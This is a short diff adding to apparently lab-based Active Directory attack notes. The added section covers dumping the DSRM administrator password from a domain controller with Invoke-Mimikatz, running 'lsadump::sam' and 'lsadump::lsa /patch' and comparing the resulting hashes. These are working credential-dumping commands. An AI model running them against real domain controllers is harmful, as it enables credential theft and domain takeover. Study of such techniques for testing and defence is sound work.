@@ -267,3 +267,23 @@ mimikatz # !-
 - After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.
 
 
+
+![](https://i.imgur.com/05CvCxs.png)
+
+
+**_Example Usage -:_**
+
+
+- Dump DSRM password (needs DA privs)
+
+```
+Invoke-Mimikatz -Command '"token::elevate"
+"lsadump::sam"' -Computername dcorp-dc
+```
+
+Compare the Administrator hash with the Administrator hash of below command
+
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -
+Computername dcorp-dc
+
+First one is the DSRM local Administrator.
